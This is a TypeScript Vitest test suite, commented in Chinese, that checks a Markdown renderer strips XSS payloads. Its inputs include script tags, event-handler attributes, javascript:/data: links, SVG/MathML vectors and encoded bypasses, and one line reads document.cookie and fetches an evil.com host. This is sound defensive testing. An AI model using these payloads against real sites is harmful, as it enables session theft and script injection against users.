// tests/markdown.test.ts — Markdown 安全渲染测试（防 XSS）
//
// 引入动机：design/03-DOCUMENTS.md §Security 要求 Markdown 渲染必须防 XSS。
// design/04-WEB-API.md §Security 要求 safe Markdown rendering、XSS prevention。
//
// 测试策略：
// - 执行级测试：实际调用 renderMarkdown，验证返回 HTML 中不包含危险内容
// - 覆盖 SSR 场景（Vitest nuxt 环境模拟 SSR，typeof window === 'undefined'）
// - 覆盖各类 XSS 载荷：script 注入、事件属性、javascript:/data: 协议、SVG/MathML、
//   嵌套编码、HTML 实体绕过、img onerror、style 注入等
// - 验证正常 Markdown 功能不受影响

import { describe, it, expect } from 'vitest'
import { renderMarkdown, extractPlainText } from '~/utils/markdown'

describe('Markdown Safe Rendering — XSS Prevention', () => {
  describe('基本 Markdown 渲染', () => {
    it('渲染标题和格式化文本', () => {
      const html = renderMarkdown('# Hello\n\nThis is **bold** and *italic*.')
      expect(html).toContain('<h1 id="heading-hello">Hello</h1>')
      expect(html).toContain('<strong>bold</strong>')
      expect(html).toContain('<em>italic</em>')
    })

    it('渲染代码块', () => {
      const html = renderMarkdown('```js\nconst x = 1;\n```')
      expect(html).toContain('<code')
      expect(html).toContain('const x = 1')
    })

    it('渲染表格', () => {
      const html = renderMarkdown('| A | B |\n|---|---|\n| 1 | 2 |')
      expect(html).toContain('<td>1</td>')
      expect(html).toContain('<td>2</td>')
      expect(html).toContain('<div class="markdown-table-scroll"><table>')
      expect(html).toContain('</table></div>')
    })

    it('允许安全 https 链接', () => {
      const html = renderMarkdown('[Google](https://google.com)')
      expect(html).toContain('href="https://google.com"')
    })

    it('允许安全 http 链接', () => {
      const html = renderMarkdown('[Example](http://example.com)')
      expect(html).toContain('href="http://example.com"')
    })

    it('允许 mailto 链接', () => {
      const html = renderMarkdown('[Email](mailto:test@example.com)')
      expect(html).toContain('href="mailto:test@example.com"')
    })

    it('允许 class 属性（代码高亮）', () => {
      const html = renderMarkdown('```js\nconst x = 1;\n```')
      expect(html).toMatch(/class=".*"/)
    })
  })

  describe('Script 注入防护', () => {
    it('过滤 <script> 标签及内容', () => {
      const html = renderMarkdown('# Title\n\n<script>alert("xss")</script>\n\nText')
      expect(html).not.toContain('<script')
      expect(html).not.toContain('alert(')
      expect(html).not.toContain('</script')
    })

    it('过滤带属性的 script 标签', () => {
      const html = renderMarkdown('<script type="text/javascript" src="evil.js"></script>')
      expect(html).not.toContain('<script')
      expect(html).not.toContain('evil.js')
    })

    it('过滤 script 标签中的复杂 JS', () => {
      const html = renderMarkdown('<script>document.cookie;fetch("https://evil.com")</script>')
      expect(html).not.toContain('<script')
      expect(html).not.toContain('document.cookie')
      expect(html).not.toContain('evil.com')
    })
  })

  describe('事件属性防护', () => {
    it('过滤 img onerror 事件', () => {
      const html = renderMarkdown('<img src="x" onerror="alert(1)">')
      expect(html).not.toContain('onerror')
      expect(html).not.toContain('alert(1)')
    })

    it('过滤 onload 事件属性', () => {
      const html = renderMarkdown('<div onload="alert(1)">content</div>')
      expect(html).not.toContain('onload')
      expect(html).not.toContain('alert(1)')
    })

    it('过滤 onclick 事件属性', () => {
      const html = renderMarkdown('<div onclick="alert(1)">content</div>')
      expect(html).not.toContain('onclick')
      expect(html).not.toContain('alert(1)')
    })

    it('过滤 onmouseover 事件属性', () => {
      const html = renderMarkdown('<div onmouseover="alert(1)">content</div>')
      expect(html).not.toContain('onmouseover')
      expect(html).not.toContain('alert(1)')
    })

    it('过滤所有 on* 事件属性', () => {
      const payloads = [
        '<div onfocus="alert(1)">x</div>',
        '<div onblur="alert(1)">x</div>',
        '<div onchange="alert(1)">x</div>',
        '<div oninput="alert(1)">x</div>',
        '<div onsubmit="alert(1)">x</div>',
        '<div ontoggle="alert(1)">x</div>',
        '<div onanimationstart="alert(1)">x</div>',
      ]
      for (const payload of payloads) {
        const html = renderMarkdown(payload)
        expect(html).not.toMatch(/\son\w+\s*=/i)
        expect(html).not.toContain('alert(1)')
      }
    })
  })

  describe('危险协议防护', () => {
    it('过滤 javascript: URL（链接）', () => {
      const html = renderMarkdown('[link](javascript:alert(1))')
      expect(html).not.toContain('javascript:alert')
      expect(html).not.toContain('javascript:')
    })

    it('过滤 javascript: URL（大小写变体）', () => {
      const html = renderMarkdown('[link](JavaScript:alert(1))')
      expect(html).not.toMatch(/javascript:/i)
    })

    it('过滤 javascript: URL（带空格 — marked 不解析为链接，保持为安全文本）', () => {
      const html = renderMarkdown('[link](javascript: alert(1))')
      // marked 因 URL 含空格不解析为链接，输出为纯文本 <p>，不存在 href 属性
      expect(html).not.toContain('href=')
      expect(html).not.toMatch(/href="javascript:/i)
    })

    it('过滤 data: URL（链接）', () => {
      const html = renderMarkdown('[link](data:text/html,<script>alert(1)</script>)')
      expect(html).not.toContain('data:text/html')
      expect(html).not.toMatch(/data:/)
    })

    it('过滤 data: URL（img src）', () => {
      const html = renderMarkdown('![xss](data:text/html,<script>alert(1)</script>)')
      expect(html).not.toContain('data:text/html')
      expect(html).not.toMatch(/data:/)
    })

    it('过滤 vbscript: URL', () => {
      const html = renderMarkdown('[link](vbscript:alert(1))')
      expect(html).not.toMatch(/vbscript:/i)
    })
  })

  describe('危险标签防护', () => {
    it('过滤 <iframe> 标签', () => {
      const html = renderMarkdown('<iframe src="evil.com"></iframe>')
      expect(html).not.toContain('<iframe')
      expect(html).not.toContain('</iframe')
    })

    it('过滤 <object> 标签', () => {
      const html = renderMarkdown('<object data="evil.swf"></object>')
      expect(html).not.toContain('<object')
      expect(html).not.toContain('</object')
    })

    it('过滤 <embed> 标签', () => {
      const html = renderMarkdown('<embed src="evil.swf">')
      expect(html).not.toContain('<embed')
    })

    it('过滤 <form> 标签', () => {
      const html = renderMarkdown('<form action="evil.com"><input name="x"></form>')
      expect(html).not.toContain('<form')
      expect(html).not.toContain('</form')
    })

    it('过滤 <style> 标签', () => {
      const html = renderMarkdown('<style>body{background:url(javascript:alert(1))}</style>')
      expect(html).not.toContain('<style')
      expect(html).not.toContain('</style')
    })

    it('过滤 <link> 标签', () => {
      const html = renderMarkdown('<link rel="stylesheet" href="evil.css">')
      expect(html).not.toContain('<link')
    })

    it('过滤 <meta> 标签', () => {
      const html = renderMarkdown('<meta http-equiv="refresh" content="0;url=evil.com">')
      expect(html).not.toContain('<meta')
    })

    it('过滤 <base> 标签', () => {
      const html = renderMarkdown('<base href="evil.com">')
      expect(html).not.toContain('<base')
    })
  })

  describe('SVG / MathML 载荷防护', () => {
    it('过滤 <svg> 标签', () => {
      const html = renderMarkdown('<svg><script>alert(1)</script></svg>')
      expect(html).not.toContain('<svg')
      expect(html).not.toContain('<script')
      expect(html).not.toContain('alert(1)')
    })

    it('过滤 SVG onload 事件', () => {
      const html = renderMarkdown('<svg onload="alert(1)"></svg>')
      expect(html).not.toContain('<svg')
      expect(html).not.toContain('onload')
      expect(html).not.toContain('alert(1)')
    })

    it('过滤 SVG foreignObject 中的 script', () => {
      const html = renderMarkdown('<svg><foreignObject><script>alert(1)</script></foreignObject></svg>')
      expect(html).not.toContain('<svg')
      expect(html).not.toContain('<script')
      expect(html).not.toContain('alert(1)')
    })

    it('过滤 <math> 标签', () => {
      const html = renderMarkdown('<math><mtext><script>alert(1)</script></mtext></math>')
      expect(html).not.toContain('<math')
      expect(html).not.toContain('<script')
      expect(html).not.toContain('alert(1)')
    })
  })

  describe('Style 属性防护', () => {
    it('过滤内联 style 属性', () => {
      const html = renderMarkdown('<div style="background:url(javascript:alert(1))">x</div>')
      expect(html).not.toContain('style=')
      expect(html).not.toContain('javascript:')
      expect(html).not.toContain('alert(1)')
    })

    it('过滤 style 属性中的 expression', () => {
      const html = renderMarkdown('<div style="width:expression(alert(1))">x</div>')
      expect(html).not.toContain('style=')
      expect(html).not.toContain('expression')
      expect(html).not.toContain('alert(1)')
    })
  })

  describe('复杂绕过尝试防护', () => {
    it('过滤嵌套 script 标签', () => {
      const html = renderMarkdown('<<script>script>alert(1)<</script>/script>')
      expect(html).not.toContain('alert(1)')
    })

    it('过滤 Markdown 链接中的 javascript 协议（带编码）', () => {
      const html = renderMarkdown('[click](javascript:%61lert(1))')
      expect(html).not.toMatch(/javascript:/i)
    })

    it('过滤 img 标签中的 data URI 脚本', () => {
      const html = renderMarkdown('<img src="data:image/svg+xml,<svg onload=alert(1)>">')
      expect(html).not.toMatch(/data:/i)
      expect(html).not.toContain('onload')
      expect(html).not.toContain('alert(1)')
    })

    it('过滤 HTML 实体编码的 javascript 协议', () => {
      const html = renderMarkdown('[click](&#106;avascript:alert(1))')
      expect(html).not.toMatch(/javascript:/i)
      expect(html).not.toContain('alert(1)')
    })
  })

  describe('extractPlainText', () => {
    it('提取纯文本', () => {
      const text = extractPlainText('# Title\n\n**bold** and *italic*')
      expect(text).toContain('Title')
      expect(text).toContain('bold')
      expect(text).toContain('italic')
      expect(text).not.toContain('#')
      expect(text).not.toContain('**')
    })

    it('截断长文本', () => {
      const long = 'A'.repeat(300)
      const text = extractPlainText(long, 100)
      expect(text.length).toBeLessThanOrEqual(103) // 100 + '...'
      expect(text).toContain('...')
    })
  })
})
